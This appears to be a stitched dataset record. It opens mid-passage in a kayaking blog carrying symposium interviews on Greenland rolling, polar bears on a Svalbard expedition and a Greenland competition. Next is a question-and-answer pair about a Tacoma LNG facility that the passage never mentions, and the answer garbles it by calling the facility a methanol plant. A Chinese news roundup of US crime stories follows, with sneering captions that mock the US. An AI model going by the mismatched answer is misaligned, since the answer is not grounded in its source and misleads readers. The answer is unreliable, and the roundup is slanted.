yeah, I do carry around a little something. I don’t have like a toolbox full of things that I might take out, because I am quite a minimalist when I go out paddling. But I do like to have something that I can sort of hang on to.\nAndrew: How did you end up becoming a member of the Hurricane Riders?\nJames: Basically, how I became a Hurricane Rider is that a number of the Hurricane Riders are local to Victoria or Vancouver Island, and they became my peer paddlers. Since I started paddling I’ve always looked up to the best paddlers out there. I tried to tag along with them so I can learn from the best. I believe that if you want to become really good at something, you’ve got to surround yourself with people that are better than you, so that’s what I did. I hung around those guys, and eventually I just got brought on as a member. I think part of that was they saw some value in me for the skills and abilities that I have in rolling. And in reverse, they have skills and abilities in rough water that are absolutely incredible that that I can gain from. It was just a good partnership to join the team. I’m very happy to be a member and they are absolutely a blast to paddle with. A lot of times when I get out into some of those rougher conditions with other paddlers, they’re very timid and very afraid of the conditions. But when I’m out with those guys, it’s just nothing but fun — pure enjoyment and fun. And inspirational. I mean, we don’t just go out there and surf. It’s all about, OK, today we are going to do THIS! It’s always the next challenge, the next challenge. So that’s what I enjoy about the Hurricane Riders in particular. It’s a great group of paddlers to paddle with.\nAndrew: What are your choice of kayaks?\nJames: I gotta be really careful what I say here because I’m a sponsored paddler, but I like a number of different kayaks. I am sponsored by Tahe Outdoors. One of the kayaks that they made in the past was the Tahe Greenland, and that is probably by far my favorite kayak that’s out there now. It is now made by a different manufacturer, but Zegul still has some Greenlands.\nSome of the other kayaks that I really like — and if I was going to say some of the better kayaks that are on the market — are the Sterling Kayaks. Absolutely hands down. The Sterling Reflection is an excellent kayak. It’s very good in rough water, and actually rolls really well too. You can get in it a half-inch cut, and a one-inch cut. And they recently came out with the Progression which is meant for smaller paddlers. It’s cutting edge. It’s very cutting edge. The designer of the kayaks [Sterling Donalson] listens to paddlers, and that’s how the kayaks are made. So he takes all the input that he can from the paddlers and puts that into the build, and as a result makes the best products out there. So thats a little plug for Sterling!\nA white Sterling Kayaks \"Grand Illusion\" at PPS. Photo © Katya Palladina\nAndrew: How is the Progression for rolling?\nJames: Actually, the Progression is awesome of rolling. It’s really, really good — surprisingly good! When I rolled the Reflection, I was impressed with how it’s secondary kinda pops and finishes. With the Progression, when you do forward-finish rolls, all you gotta do is get your head up to the surface and the kayak just lifts. It’s amazing! It’s almost as if it does the roll for you. It’s a very odd feeling, actually, where it just has this incredible secondary stability and it pops. I think that has a lot to do with the rocker profile and its volume. As soon as you turn it over it just wants to lift right back up. Yeah, it rolls excellent. It’s a really good rolling kayak.\nAndrew: I was wondering about that, because the conventional wisdom is that you need a really low volume kayak to do those Greenland rolls.\nJames: Well, you need a really low volume kayak to do some of the harder layback rolls, for example. Because you are looking to get back onto that back deck. Like a straight jacket roll, for example — good luck doing that in a touring kayak! That is something you gotta do in a very, very low volume kayak. So it really depends on the rolls and what your goals are. When we’re doing a lot of sea kayaking, the focus really isn’t on straight jacket rolls. I don’t think anyone is going to go out into the rough, get knocked over and think, “Oh, I don’t need a paddle”, and roll a kayak. We don’t really rely on the back deck that much when it comes to that.\nI try to teach more forward finish rolling when it comes to the larger volume kayaks because with some tour kayaks you just can’t lie on the back deck all the way. And they become very difficult to do layback rolls in, so I find that, when that’s the case, I’ll teach the storm roll or some variation of a forward finish roll.\nAndrew: Is teaching sea kayaking a full time job for you?\nJames: Yeah, I’m a professional kayaker. I do travel around the world, and I teach, and it's what I do full time. In the winter I supplement myself a little bit with some programming work, being an ex-programmer, just to bring in a little bit of extra income. But other than that, for about 10 months out of the year I’m a full-on sea kayak instructor. It’s my profession. This will be my third year as a professional instructor. It’s extremely rewarding. It definitely doesn’t feel like a job. And I would say probably, if it was a job, it would be the best job in the world! Hands down!\nI’ve been blessed to be able to travel to lots of different spots. Japan I think was probably one of the greatest places I’ve been. Just the way they treat you there — like royalty! It’s so great! They are so kind and so accepting, and they learn incredibly well, even though there was a language barrier there, and I couldn’t speak to a lot of them. It was just a matter of getting in there, and twisting the shoulders, and doing this, and I’m almost like twisting Gumby, and they’re rolling! It was like, “Wow! These guys are really good!” Like they just picked it up really, really quick!\nI think one of the reasons I am good as an instructor is because a lot of the rolls that I learned were all self-taught. I learned how to do it wrong just as well as I learned how to do it right. So if I watch someone do it wrong, I know exactly what’s going wrong. And I know exactly how you can fix that problem. It’s just a matter of being visual. I can see how someone is rolling and be able to detect incorrect things. I think a lot of that comes from being self-taught. If you are taught how to do it one way, then how do you know how to do it wrong? You don’t.\nAndrew: At some point you must have gotten instruction from other coaches, the gurus of Greenland kayaking?\nJames: I did. Actually, at one point I hired Cheri [Perry] and Turner [Wilson] when I was learning to do forward finish hand rolls, because I was struggling with that a little bit. I didn’t really get very far with the session, but there were little nuggets of information in there that stuck with me.\nStill, a lot of what I teach now with the hardest rolls, I’ve never even seen online. I’ve never been taught it, but when you watch some of the Inuit paddlers do the hardest rolls, it’s pretty obvious — some of the disconnection between the energy in the legs and the upper body, and the load-drive concept. A lot to people are just doing a “hip snap” to roll a kayak, or they are talking about lifting their leg. But they’re not really talking about what is happening to the other leg.\nAndrew: What exactly is the load-drive concept?\nJames: So the load-drive concept is relevant to a lot of sports. It’s relevant to baseball. It’s relevant to golf — a lot of sports. Kayaking is another one. We use our legs often, and the load-drive concept is about the legs. If you are “loading” a kayak, you’re going to lift one leg and drop one leg down, and you’re putting pressure upward and downward on the kayak. So if this is the load position, than this would be the drive position — it would be the opposite.... When I roll the kayak, I’m loading the kayak up. Some of the benefits to loading the kayak is that I can get more power when I drive the kayak.\nOne way that I like to explain that to students is that it’s like throwing a baseball. If I threw a baseball from my shoulder and I throw it forward, I might get about 10 feet. But if I take that baseball to my shoulder and I load it up, and then I throw it, I’ll probably get about 50 feet. So I gain a tremendous amount of power by adding the load-drive concept to it.\nBut it can work against you, just like throwing a baseball. When you first learn to throw a baseball and your dad said, “Get it back there and throw it.” And you did this, and it just kind of fell to the ground, or went to the left or the right. It’s very much the same. The timing and the technique has still gotta be there in order to get that accurate throw. So it’s very much the same as in a kayak.\nSome of the benefits again to loading the kayak up: when you are loading the kayak you can get your face closer to the surface, therefore you can reach further for leverage. It makes it easier to roll the kayak.\nThe load-drive concept is something that I never really learned from anybody else. I was always told about a “hip snap\", or “lift the leg”, but nobody ever talked about that other leg. What is that other leg doing?\nWhen it comes to the some of the hardest rolls, forward finish brick rolls, for example, you gotta load and drive the kayak. If you don’t, it’s gonna be almost impossible to do that roll. The load drive concept is the trick to the hardest rolls.\nSo I like to teach that to beginners. If you can teach a beginner the hardest technique, or the theory behind the hardest technique, and they can learn that from the beginning, then their success rate is huge. They’ll continue to roll. It’s not just take a rolling session and never roll a kayak again. They actually continue to roll because they’ve got so much power in their legs once they sort that out. So that’s the load-drive concept.\nKatya: What is kayaking for you? Two sentences.\nJames: Kayaking for me is therapy. That’s one sentence. But it’s powerful!\nPosted at 11:03 AM in 2015, Pacific Paddling Symposium, The Art of Greenland Style | Permalink\nJAIME SHARP: Encounters with Polar Bears and the Svalbard Expedition\nJaime Sharp: Encounters with Polar Bears from Andrew Elizaga on Vimeo.\nExplorer/adventure photographer Jaime Sharp is in arctic Norway right now, attempting the first successful circumnavigation of the Svalbard archipelago by sea kayak with a team of two other kayakers, Tara Mulvany and Per Gustav Porsanger. Three previous attempts have been made, all ending in failure. Among the biggest hazards: polar bears. There are over 3000 polar bears living on the island, which makes it one of the areas with the highest concentration of polar bears in the world. “Polar bears are one of the few animals that are purely predatory,” Jaime said, speaking to the crowd gathered at the Pacific Paddling Symposium on Vancouver Island this past May. “And they are one of the only animals that will actually hunt humans intentionally, not because they are curious but because it’s like, you are moving, so you are food. Polar bears will also hunt the seals that have burrows under the snow. They walk around listening for them and smelling them out. Then they smash through the snow and pull the seal out.”\nJaime says that polar bear attacks were the reason for the failure of two previous attempts at the Svalbard circumnavigation. During the first expedition, a polar bear smashed one of the kayaks, so the team had to back out. In the last expedition, “a polar bear actually attacked them in their sleep in the tent. Dragged them out of the tent, one of the guys by his head. They had to shoot the bear.” As the bear came through the tent it stood on one of their rifles and snapped it in half. Luckily they had two, so they were able to get the other rifle and kill the bear.\nTo deal with polar bears, Jaime's team plans to have an active watch: “In the high concentration bear areas, one of us will be staying awake at any point. So we will do three-and-a-half hour shifts, staying awake as well as having a perimeter fence. On top of guns, we will also be carrying daggers and flares and stuff like that, doing everything we can before have to shoot a bear.”\nBoys Hunting Book 1890\nAnother hazard is ice. The second expedition was cancelled because pack ice came in and the team had to start dragging their kayaks across the ice. The ice \"started drifting away, taking them away from the island. And eventually they fell through the ice so many times they got injured, and they had to abort. So the ice and the polar bears are probably the biggest risk. Then on top of that you have the walrus. They can be territorial on the water and are known to come up to Zodiacs and puncture the Zodiacs with their tusks. Imagine them coming up to a kayak — they’ll rip the the back half of your boat off! The ice is also an issue not just because it might drift and block us off, but it may not actually recede. It may not actually melt completely and we can’t actually get around a quarter of the island route. So those are kind of our biggest challenges that we’re facing.“\nYou can follow Jaime’s expedition at his website, svalbard.worldwide adventure.com.\nAttaque de morses, 1870 Below is the complete transcript of our interview.\nAndrew: Have you personally had encounters with polar bears? Jaime: Back when I was like 25 I guess, or 26 —not too long ago, I’m only 34 — I worked up in Churchill, Manitoba and I was a dogsled guide up there. We’d actually run clients out on the tundra. Anyone who knows of Churchill, Manitoba, knows it’s the polar bear capital of Canada. So we’d see polar bears pretty much every day. Numbers of them. We’d encounter them on the dog sleds. Our dogs would want to chase them. The bears are scared of dogs, especially when you’ve got 8 of them trying to chase them. So my biggest issue was trying to stop the sled and keep them in position while I got the shotgun off my back and fired off a blank above them just to make sure the polar bear is running.\nThen we would have them coming at night. We had a little cabin we lived in. We had 46 dogs that lived around the cabin and an electric fence. And we had all the frozen chicken meal and stuff that we’d use to feed the dogs under the house, but the polar bears could smell it. So they would be coming in at night time to look for this food. They’d hit the electric fence. that would keep them back, but then the dogs would of course be barking. So we’d wake up. Here’s this huge polar bear on the other side of the fence. We’d have to put a spot light on it to see it. It’s not been deterred by all these dogs, so then we’d have to shoot blanks. And that wouldn’t necessarily work. So then we would have an M80 shell that you could shoot. We would shoot a little wad of explosive out, and it would go BOOM. And then sometimes that wouldn’t work. We had to bounce one off of one one time, a big male who was probably 13 ft tall, if he stood on his back legs. That was kind of a regular occurrence on most nights.\nAnd then we had another instance where we were right next to the arctic research center and that was where we’d go have meals. And they had a storage room with the freezers in the back. So they pulled out all the meats and stuff to thaw one night for all the staff, and they had a bunch of tofu sausages and bacon and sausages and stuff out there. And these two young polar bears came in and they broke open the wall. And they took and ate all the food, and they left the tofu sausages!\nBut then the next day, they had to get out the traps. They had these big trap door barrels, these huge barrels that they could go inside, and then it shuts. They had to trap them, but only one was able to be trapped. That was a very interesting to sit and watch them actually go in and see the trap go down. This trailer that it was on, I think it took like six men to manhandle off the back the back of the truck to get it into position. It was just really solidly built. Suddenly the trap doors comes down. This young polar bear is in there, and this whole thing is lifting up and down on it’s wheels as it’s trying to bash its way out. So you can just see the power of the bear. And that was really interesting because at that point I was able to go up to the grille and be like THIS CLOSE to the polar bear. And he’s in there and he’s just putting his claws down the grille, and he’s taking the paint flecks off the steel grille. You can just see how much power was in those claws, and you just knew that if it was raking human flesh, there would just be no chance. That was really my closest encounter with them.\nBut then I’ve also had closer, more insecure moments with them, where they’ve been maybe 200-300 meters from me, and all that’s between me and them was the shotgun I had in my hand. So that’s always been a little bit more intimidating. Just walking between our house and where we eat, and there’s a polar bear sitting on the tundra. Just keeping an eye on them, just making sure that they’re there.\nBut this trip is going to be a totally different barrel of polar bears really, because the ones in Churchill are used to having people around.They are used to being hunted by man. They are used to dogs hunting them with man. So they’ve got more of an intimidation factor against them from man and dogs. So it was easy to use that aspect to sort of stay safe. But where we’re going in Svalbard they have not been historically hunted by man, so man is definitely something that’s on the food chain for them. They are a lot more curious. They are lot more willing to encounter man. But that being said, there’s 3000+ polar bears on the island, but in the last 10 years there have been maybe three polar bear attacks. So the odds are pretty low still. There’s probably still more chance of being run over by a car than anything.\nKatya: So the reason you’re going is because you just love polar bears? Honestly. I mean, what are the reasons?\nJaime: Well, I love kayaking. I love the challenge of kayaking. For me it’s an epic opportunity to actually do a kayaking trip that’s a world first. It’s also a trip that pushes everything I’ve known about kayaking and what I’ve been able to do. I started kayaking when I was 12 years old and I’ve just pushed it, and I’ve been an outdoor educator and guide and instructor. This for me is a chance to see what I’m made of, and also to be able see polar bears. You don’t want to see them too close. It’s always amazing to be out there. You see walrus and polar bear and bowhead whales and stuff like that. That’s always pretty magic. To go to a place that no other person has very rarely ever been, especially by kayak, is a very unique kind of experience. That’s something that I’ve always longed to experience.\nPosted at 08:34 PM in 2015, Pacific Paddling Symposium | Permalink\nFreya Fennwood prepares to compete in the 2015 Greenland National Kayaking Championships\nFreya is going to Greenland from Andrew Elizaga and Katya Palladina on Vimeo.\nWe caught up with outdoor action photographer Freya Fennwood at the South Sound Traditional Inuit Kayak Symposium (SSTIKS) this past weekend while she was training for her upcoming trip to participate in the Greenland National Kayaking Championships. She brought along a sporty new kayak, custom-designed by her father, John Lockwood, owner and designer of Pygmy Boats, the Port Townsend manufacturer of wooden stitch-and-glue kayak kits.\nAfter the rolling demo we sat sat down to talk with her about her preparations for Greenland. Here is the full transcript of our interview:\nAndrew: What inspired you to take the trip to Greenland?\nFreya: My father designed a boat specifically for me and specifically to do Greenland rolling. We came to SSTIKS actually, and Dubside was like, “You guys should go to Greenland with this boat! Freya is really good! I think she could compete and do well!”\nIt’s really not about doing well. It’s just a really good excuse to go take this boat there and go participate in the paddling culture, which is something that I’ve been born into and been in my whole life. To go to the birthplace of kayaking sounds like a really awesome experience, so I’m really excited to see what it’s like there, to meet the people, and participate in what they do.\nAndrew: Can you tell us about what you mean about being born into the kayaking culture?\nFreya: I’ve been paddling boats — in boats— since I was 18 months old. My dad designed the first kayak for me when I was 5. It was built by the time I was 6, and I paddled that. Then he designed me another boat, maybe when I was around 10, the Osprey 13. And that was my next boat, and then he didn’t really design me another boat until he designed the Freya. He decided to call this boat the Freya after me, which is pretty sweet! Can’t complain. Gotta boat named after me!\nAndrew: How did your father get interested in Greenland style?\nFreya: Really it’s not something he’s been into for super long. He probably picked up a Greenland paddle about 5 years ago. I remember as a little kid at kayak symposiums, seeing people with Greenland sticks and just thinking it was the silliest thing I’d ever seen. And then my dad comes up to me — he is just raving about this paddle and how it doesn’t hurt his shoulders, and how he can paddle twice as far as he could with the Euroblade. And I was like, OK, I’ll try it out. And I tried the Greenland paddle and I was like, Oh, I’m pretty young but this does actually NOT hurt my shoulders as much. I can paddle just as fast or faster, and longer with the Greenland paddle. So that kind of interest in Greenland paddling started from using the paddle first and then getting more interested in the boats.\nThe Pygmy boats my dad designs are definitely based off of traditional Greenland kayaks — he’d have to tell you —some big book of classic Inuit designs. His designs definitely take from that, but we’re only starting to come out with lower volume boats that are really made to do Greenland rolls really well in the past couple years.\nAndrew: Tell us about your kayak. Was it designed specifically for rolling?\nFreya: The Freya is really optimized to be a rolling and a kind of rock gardening play boat. We optimized it specifically for rolling, to do forward finishing rolls really well, and to do layback rolls really well. So the boat has more rocker than any other boat my dad has ever designed. It has more volume in it than a traditional, typical rolling skin-on-frame kayak, which actually helps it pop and roll up more. But it has a really low rear deck. My dad has designed this recess that is actually something that he came up with, that Pygmy has got a patent on, that really allows the back deck to be super low and then pop up to have nice volume, to have the boat flip back up. So really people are surprised when they see the boat. They think it looks really too-high volume, like, “Oh, thats probably not going to be that easy to roll.” And I’m like, “No, I’m decent at rolling but my boat is really good at rolling.”\nAndrew: So you are taking the Freya to Greenland? What does it take to get a kayak over there?\nFreya: We took the boat, and the shop cut it into 3 pieces. So it’s actually a three-piece take-apart kayak. We got the specs from the airlines — exactly how long the segments are allowed on the flights — and we cut the boat to those specifications. It’s bolted together at the hatches essentially.\nAndrew: What kind of training have you been doing to prepare for the kayaking competition?\nFreya: We’ve been thinking about potentially going for couple years and so I’ve been slowly learning. I learned how to roll about 4-5 years ago. I didn’t actually know how to roll, like as a little kid. Most of our kayaking is flat water stuff that is really close to shore. You would needn’t to use a roll.\nSo I learned how to roll, and then I ended up being kinda decent at it. And it was fun just to learn all these other ones. And then the possibility of going to Greenland really motivated me to learn a lot more rolls. I probably wouldn’t have learned this many rolls if there wasn’t a purpose to it. A roll generally for me is for a purpose. I learn to roll so I can go into rougher, wilder conditions. To roll in 30-some ways, the purpose for me is to go experience Greenland.\nAndrew: Have you been consulting and asking for advice from some of the other people who have participated?\nFreya: I’ve talked to Dubside, and he’s taught me rolls here at SSTIKS, and has really informed us about Greenland. I was just up in Victoria with James Manke. He went and competed last year in Greenland, and he gave me a ton of information. I learned that I was supposed to preregister, and the registration was due last week! Hopefully it worked out. He contacted a person who is the head of registration, and was like, “We have this girl, Freya. She’s coming to Greenland! She really wants to participate! She had no idea there was registration that needed to be done!” So he’s been a huge help with his knowledge. But there’s a lot of information that’s hard to find.\nI’ve talked to Helen Wilson, and she’s been super helpful. But there’s just a lot you don’t really know until you get there. They all say you just have to go with the flow, and go with the intention of just participating and having fun. The schedule may be two days late, so I’m just going and hoping to hang out in a beautiful place and meet other people who like to kayak.\nAndrew: Do you know if there are any other international competitors going?\nFreya: I have no idea if there are other international competitors. I don’t believe if there are any Canadians. I don’t know if there are any Americans. I don’t think so, so I'll find out!\nPosted at 09:38 AM in 2015, The Art of Greenland Style | Permalink\nCheck out my VIMEO channel!\nBaja Expedition Skills Course 2006\nBuilding a Joel White Pooduck Skiff\nCedar Strip Kayak Construction: the Baidarka\nCedar Strip Kayak Construction: the Shooting Star Baidarka\nDancing with Hope\nDubside Watch\nFamily Europe 2006\nGreenland Style Skin On Frame Kayak Building\nHow to Build a Wood Stand Up Paddleboard (SUP) Free Step-By-Step Instructions\nKayaking along the Peruvian Coast\nKayaking Johnstone Strait and the Broughton Archipelago\nNorthwest Paddling Festival\nPacific Paddling Symposium\nPhilippines Baguio Mission 2014\nPhoxx Ekcs: Expedition Along Vancouver Island's North Coast\nPuget Sound Kayak Routes\nPuget Sound Sea Kayak Symposium\nSailing St Martin and St Barts\nThe Art of Greenland Style\nThe Philippines Baguio Mission 2013\nWest Coast Sea Kayaking Symposium\nWooden Boatbuilding", "question": " What is the proposed LNG facility in Tacoma, Washington, and what are some of the criticisms and concerns surrounding it?", "answer": "\nThe proposed LNG facility in Tacoma, Washington is a $3.4 billion methanol plant that would be the biggest thing to happen to Tacoma in years. Criticisms and concerns surrounding the facility include the following:\n\n1. It threatens to turn Tacoma back into a polluted, stinky industrial town, undoing the progress made in cleaning up the city's waterways and image.\n\n2. It would use natural gas obtained by fracking, which has environmental and health concerns related to water pollution, air pollution, and earthquakes.\n\n3. It poses a risk of explosion and pollution from transporting explosive chemicals through narrow urban waterways.\n\n4. It could liquify in a major earthquake due to being built on reclaimed land.\n\n5. It would consume an enormous amount of water, electricity, and gas, potentially increasing utility rates for everyone in Tacoma.\n\n6. It would create a \"sacrifice zone\" for the continued use of fossil fuels, which is not aligned with the city's sustainability goals.\n\n7. There has been a complete lack of transparency and engagement from the Port of Tacoma and city government in the decision-making process.\n\n8. It would likely have negative economic impacts on nearby neighborhoods and businesses.\n\nIn summary, the proposed LNG facility in Tacoma is facing significant criticism and controversy due to environmental, economic, and social concerns."}
{"text": "这个秋天,地球那边的黑色幽默\n1、吸毒 -大麻极好,助亮灯塔！ 路透社9月1日电,当日公布的一项研究结果显示,美国大学生每日吸食大麻数量到达34年来最高点。 密歇根大学的研究发现,2014年,近6%的美国大学生称自己每日吸食大麻,上一次最高的数字出现在1980年,为7.2%。 研究的主要作者劳埃德·约翰斯顿表示,在过去七八年里,美国大学生吸食大麻数量明显增多,这在很大程度上与我们在高中看到的增长相似。 2014年,35%的19-22岁高中毕业生认为经常吸食大麻是危险的,而2006年持这种认识的同龄人还有55%。 使用任意非法毒品的美国大学生比例也在2014年达到41%,而2006年这个比例为34%,增长的部分主要是大麻。 可卡因在大学校园里卷土重来,2014年,4.4%的美国大学生表示自己在过去12个月中吸食过可卡因,而2013年这个比例为2.7%。 2、脱靶 -这枪法,难道质量问题！？ 美国《赫芬顿邮报》9月6日报道,6名纽约警察朝一名抢劫犯开了84枪,其中83枪\"脱靶\"。 4日凌晨,纽约布鲁克林一名黑人男子在抢劫后逃离时开枪打中受害者手臂,然后遭到警察追捕。在警察发现嫌犯后,他朝警察开火,于是4名警察还击,52发子弹没有一发打中嫌犯,而嫌犯的子弹反而击中了警车。 然后嫌犯又遇到了两名警察,这两名警察朝他开了32枪,只有一枪打中嫌犯的小腿。 据悉,嫌犯此前曾经被逮捕过12次,其中包括4个抢劫案。 就在8月28日,纽约警察朝两名嫌犯连开11枪,只有一枪击中一名嫌犯,另一人逃走,而一名63岁路人手臂和胸部中枪受重伤。 3、破烂 -自由生在霉梨贱,民主难为\"破烂王\"！ 美国《奥兰多哨兵报》9月3日报道,美国佛罗里达州一名\"破烂王\"因为在自家院子囤积大量破烂而被关进监狱近5年,并被罚款近200万美元,但他还是没有保住自己的破烂。 3日,阿尔塔蒙特斯普林斯居民艾伦·戴维斯眼睁睁看着自家院子里35吨破烂及三辆车被政府雇来的工人们清除。官员称清理费用为8000-美元,戴维斯被要求支付账单。 为了这些破烂,从2003年以来,戴维斯先后入狱三次,累计坐牢近5年,并被罚款190万美元。而这一次,警长办公室称他们将向州检察官办公室递交报告,这将确定戴维斯是否会被指控乱丢垃圾的重罪。 戴维斯表示自己要提起诉讼。\"宪法第四修正案说我拥有私有财产权。这是私人财产,这不是公共财产...我问他们有没有搜查令,他们什么也没说。他们怎么能在私人财产上这样做呢？\" 4、成瘾 -伟大体制下的霉果母亲,买不起处方药,却买得起毒品！灯塔照亮民主婴儿,生来就有成瘾自由！ 英国��每日邮报》9月7日报道,短短十年间,美国毒品成瘾的新生婴儿数量翻了两番。 发表于《新英格兰医学杂志》上的研究首次透露的数据显示,2004年,美国每1000个新生婴儿中7个有毒品依赖,而2013年,这一数字跃升至27个。 研究称,毒品的影响可能已经写入了婴儿的dna。 医生将新生婴儿毒品成瘾数量的攀升归咎于制药公司,他们说由于低收入母亲们买不起处方止痛药,只好走上街头购买海洛因。 5、法官 -\"钱\"任法官,行为常见！ 美国《纽约时报》9月5日报道,令人震惊的录像画面显示,美国佐治亚州一名法官在法庭上威胁穷人,如果立即拿不出现金缴纳交通罚款,就把你送进监狱！而人权律师表示,这名法官的行为很常见,只是其他人没有被拍下发到网上而已。 这段超过40分钟的录像显示,美国佐治亚州波顿法官理查德·戴门特在法庭上要求被告缴纳数百美元罚款,问他们是否把钱带上了法庭,并威胁如果不交钱的话就去坐牢。 在录像的其他部分,可以听到法官对被告说,如果他们交不起钱,那么家人和朋友就必须替他们交。 然后可以听到被告说,他们太穷了,没有工作,没有钱,交不起罚款。 而根据美国最高法院裁定,不能因为没钱交罚款而将犯罪者投入监狱。而佐治亚州法律也规定,贫困的被告有权被指派一名州律师。 南方人权中心律师莎拉·杰拉蒂表示,法官的这种行为是常见的,只是没几个被人录下。\"这只是在全州法院里发生着的类似事情中的一斑而已。\" 6、凶杀 -生日即忌日,快乐灯塔国。 美国哥伦比亚广播公司9月4日报道,1日晚,美国新泽西州朗布兰奇一名35岁男子枪杀了29岁女友、7岁和4岁的两个儿子,点燃房子后开枪自杀。 据称,受害者的尸体在楼上同一间卧室里被发现,现场迹象表明他们曾为活命而挣扎。 美国《洛杉矶时报》9月7日报道,6日,在全家从迪斯尼乐园度过一天回家后,洛杉矶一名35岁消防员当着6岁儿子的面枪杀了当警察的32岁妻子,把孩子送到父母家之后,他开车到消防仓库饮弹自尽。 据悉,这对夫妇近几年遭遇了财务困境。 美国弗吉尼亚州wavy电视台9月6日报道,6日,一名26岁的美国海军一级士官水手在弗吉尼亚州威廉斯堡的家中枪杀了27岁妻子,而凶案发生时,其4岁的儿子及5个月的女儿都在家中,目前尚不清楚其子是否目睹母亲遇害。 美国《夏洛特观察报》9月6日报道,这个劳动节周末,北卡罗来纳州夏洛特发生10起枪击事件,5人死亡,其中包括一名7岁儿童,这名儿童是在自己的生日聚会上被枪杀的。 生日即忌日,这在美国早有先例。 7、驱逐 -前后任,狗咬狗,无家归,纽约\"客\"。 英国《每日邮报》9月8日报道,前纽约市长鲁迪·朱利安尼9月6日在《纽约邮报》撰文,尖刻批评现任市长比尔·德·白思豪改善无家可归者境况的政策是历史\"倒退\"。而白思豪办公室也进行回击,讥讽朱利安尼当年的战略是将无家可归的纽约人\"从一个角落追到另一个角落\"。 朱利安尼在文章中写道,\"一个街上有无家可归者的城市,是一个对它的人民没有爱的城市。\"众所周知,1994年到2001年,朱利安尼任纽约市长时,指挥警察满大街围捕无家可归者。而关于他处理无家可归者的最新说法是\"将无家可归者逐出城市\"。 朱利安尼在文章中说,现任市长\"所谓 进步 观点称人们有权在人行道上居住,不仅没有法律上的支持,也是不人道、不雅和危险的。人们住在大街上,随地大小便,是让纽约重回西方文明的黑暗时代。\" \"在一个人道、体面、文明的城市,无家可归的问题应该通过干预而不是否定来处理。\"他说。 白思豪办公室告诉哥伦比亚广播公司,在朱利安尼任市长期间,纽约市无家可归者数量增加了27%,\"他的战略是无效的,错误的\"。 无家可归联盟的统计称,纽约市有6万人无家可归,其中2.5万是儿童。 8、财产 -为了飞碟？最后通牒！先别管三体外星人,说好的霉果仁权呢！ 美联社9月7日电,美国空军给位于内华达州\"绝密51区\"附近的矿产业主下了最后通牒:10日之前必须接受对他们1.6平方公里财产总计520万美元的\"最后报价\",否则政府将强行没收这1.6平方公里土地。 大约20名业主称家族采矿产业从19世纪70年代就已开始,上世纪40年代,美国空军进驻该地区,1951年开始在此片区域进行核试验,而矿产企业也因此在1959年被封闭。 联邦政府逐渐包围这片位于拉斯维加斯西北不到400英亩(1.6平方公里)的矿产,周围1.17万平方公里的安全保留区用于核试验、军事训练和其他研究。 业主代表称,1986年,作为环境研究的一部分,自己的父亲与叔父在给美国空军的信中,认为这片财产的价值为1360万美元。而空军官员称,这片财产在上世纪八九十年代的评估价值顶多也就120万美元。 9、起火 -发动机 美联社9月8日电,当日,一架英国航空公司波音777客机在美国拉斯维加斯机场起飞时发动机起火,在飞行员果断采取反应措施后,159名乘客和13名机组人员成功从紧急滑梯\"奇迹般\"逃生。 10、家庭 -人们以\"荒谬的速度\"被枪杀只是因为\"我们没有勇气改变法律\",不是说霉果的法律是健全的吗？当然不需要改变！ 美国广播公司9月8日报道,当日,美国佛罗里达州一名18岁青年在自己家中枪杀了用枪顶着自己母亲头的蒙面者,悲剧的是,事后他才发现,他打死的是自己已疏远的亲生父亲。 据悉,46岁的约翰·海斯勒当场死亡,他被发现带着两把玩具枪闯入房子。海斯勒有吸毒和酗酒的历史,警方称当时他可能处于醉酒状态。18岁的马拉基·海斯勒与13岁的妹妹、37岁的母亲以及母亲47岁的新男友当时在家里。 当局称不会对小海斯勒提起指控。 美国《堪萨斯城星报》9月8日报道,当晚,美国密苏里州堪萨斯城一家三口被发现在家中遭枪杀,其中包括一个婴儿。 该市市长斯莱·詹姆斯在现场气愤地表示,人们以\"荒谬的速度\"被枪杀只是因为\"我们没有勇气改变法律\"。 这名婴儿是今年以来该市第7个无意识中被杀害的16岁以下孩子,其中3人是被枪杀。 根据fbi的数据,堪萨斯城是美国第14个最危险的城市,2013年,每10万人中有1283起暴力犯罪。 美国佐治亚州wsbtv电视台9月7日报道,5日早晨,美国佐治亚州格威内特县一对22岁和17岁的兄弟谋杀自己睡梦中的亲生父母未遂,其50岁的父母都受重伤。 11、撒谎 -美国的污染和执法不严,难道也想静静了？ 英国《每日邮报》9月9日报道,电影《永不妥协》(erin brockovich)女主角同名原型艾琳·布劳克维奇指责美国环境保护署在上月发生的科罗拉多州金矿毒水泄漏事件中对民众撒谎。 在泄漏事件后,布劳克维奇造访了美国最大的印第安保留区,在那里,她见到了纳瓦霍族首领,并看到了毒水泄漏的巨大破坏。 8月5日,科罗拉多州一个废弃的金矿在环境保护署雇佣的私人承包商挖掘入口时造成1.14万立方米含有铅、砷、铊等有毒元素的废水倾泻入河流中,科罗拉多州、新墨西哥州、犹他州的一些河流都受到了污染,而这些河流是许多地区的饮用水源。 布劳克维奇表示,\"1.14万立方米\"的数据是环境保护署在撒谎,实际数量要大得多。 纳瓦霍人酋长也质疑政府的数字,他讲述了布劳克维奇造访期间一起看到的矿井泄漏状况,有毒的废水仍然不断涌出矿井。灌溉系统因此关闭,成千上万亩农作物处于干旱之中。 \"这是一个可怕的灾难,不幸的是,我们看到的不仅是纳瓦霍族的状况,也是发生在整个美国的状况。\"布劳克维奇抨击美国的污染和执法不严。 2001年,朱莉娅·罗伯茨因出演艾琳·布劳克维奇而被奥斯卡封后。 12、背后 -警察对桑布拉诺-蒙特斯共开了17枪,17枪,这枪法,这仇恨 美国《赫芬顿邮报》9月9日报道,今年2月10日,美国华盛顿州帕斯科一名35岁的无家可归者因为朝警察投掷石块而在逃跑时被警察开枪打死(本站报道链接在此)。9月9日,检察官宣布,对涉案的3名警察不予指控。 受害者安东尼奥·桑布拉诺-蒙特斯是一名移民工人,警方称因为他不听让他和平走开的重复命令才开枪,但旁观者的视频显示了警察使用了不必要的武力。据报道,警察对桑布拉诺-蒙特斯共开了17枪。 一名证人作证时说,\"当时看样子他打算把石块放下,我认为警察是从他背后开枪的。\" 富兰克林县检察官表示,这3名警察不会面临刑事指控,因为没有明确证据证明警察的行为是恶意的。 代表桑布拉诺-蒙特斯妻子和孩子的律师对这一结果表示失望。他说检察官的声明只是保护执法者的借口而已。\"我们对此结果并不感到意外,但是觉得恶心和失望,这也是我们一直要求独立调查的原因。\" 13、灭门 -谋杀自杀,亲情屠杀 (9月12日更新)美国哥伦比亚广播公司9月10日报道,10日,美国明尼苏达州一家五口被发现陈尸自家价值超过200万美元的湖畔豪宅中,现场迹象表明这是一起谋杀-自杀事件。 